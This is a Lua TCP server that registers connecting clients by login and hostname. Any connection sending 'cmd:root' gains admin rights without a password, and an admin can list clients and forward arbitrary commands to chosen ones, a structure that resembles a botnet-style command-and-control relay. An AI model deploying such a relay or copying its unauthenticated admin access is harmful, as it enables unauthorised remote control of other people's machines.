socket = require "socket"
copas = require "copas"
require "json"

local ServerIp = "*"
local ServerTcpPort = 1234

i		  = 0
nb		= 0
cl		= 0
s 	= 0
dt 		= 0
ad = 0

Clients = {}
Admins = {}

function log(str)
	print(str)

end

local tcpSocket = assert(socket.bind(ServerIp, ServerTcpPort))

function handler(skt)

	skt = copas.wrap(skt)

	local tcpIp, tcpPort 	= skt.socket:getpeername()
	local root = false

	Clients[tcpIp..":"..tcpPort] = {ip = tcpIp, port = tcpPort, skt = skt}
	print("new client:\t\t"..tcpIp..":"..tcpPort)
	local me = Clients[tcpIp..":"..tcpPort]

	cl = cl +1
	while true do
		nb=nb+1
		local data, status, partial = skt:receive()

		if data then
			--print(tcpIp..":"..tcpPort.. " :\t"..data)
			if(root) then
				if (data:sub(0,4) == "cmd:") then
					data = data:sub(5)
					print(data)
					if (data == "client") then
						--me.skt:send(tostring(cl).." Clients:".."\n")
						me.skt:send("jso:lst:"..json.encode(Clients).."\n")

						--for k,v in pairs(Clients) do
						--    me.skt:send("tcp : "..v.ip..":"..v.port.." : "..v.login.."@"..v.hostname.."\n")
						--end
					elseif (data == "admin") then
						me.skt:send(tostring(ad).." Admin:".."\n")
						for k,v in pairs(Admins) do
							me.skt:send("tcp : "..v.ip..":"..v.port.."\n")
						end
					elseif (data:sub(0,4) == "run:") then
						tab = json.decode(data:sub(5))
						print(data:sub(5))
						if (tab) then
							Clients[tab.ip..":"..tab.port].skt:send(tab.cmd.."\n")
						end
					else
						me.skt:send("cmd inconue\n")
					end
				else
					for k,v in pairs(Clients) do
						v.skt:send(data.."\n")
					end
				end
			elseif (data == "cmd:root") then
				Admins[tcpIp..":"..tcpPort] = {ip = tcpIp, port = tcpPort, skt = skt}
				ad = ad + 1
				cl = cl -1
				root = true
				print("root")
				for k,v in pairs(Admins) do
					v.skt:send(v.ip..":"..v.port.." new admin\n")
				end
				Clients[tcpIp..':'..tcpPort] = nil
			elseif (data:sub(0,6) == "login:") then
				--print(data)
				data = data:sub(7)
				me.login, me.hostname = data:match('(.*):(.*)')
				double = 0
				for k,v in pairs(Clients) do
					print (v.login, me.login)
					if v.login == me.login then
						double = double + 1
						--print("double")
					end
					print(double)
					if double > 1 then
						v.skt:send("run:kill\n")
					end
				end
				
				--print(me.hostname, me.login)
			else  --print(data)
				for k,v in pairs(Admins) do
					v.skt:send("jso:dat:"..json.encode({client = me, data = data}).."\n")
				end
			end
		end
		if status=="closed" then
			print(status..":\t\t\t"..tcpIp..":"..tcpPort)
			if (root) then
				ad = ad -1
				Admins[tcpIp..':'..tcpPort] = nil
				break
			else
				cl = cl - 1
				for k,v in pairs(Admins) do
					v.skt:send("jso:"..json.encode(Clients[tcpIp..':'..tcpPort]).."\n")
				end
				Clients[tcpIp..':'..tcpPort] = nil
				break
			end
		end
	end
end

copas.addserver(tcpSocket, handler)


while 1 do
	copas.step(0)
	socket.sleep(0.2)
end
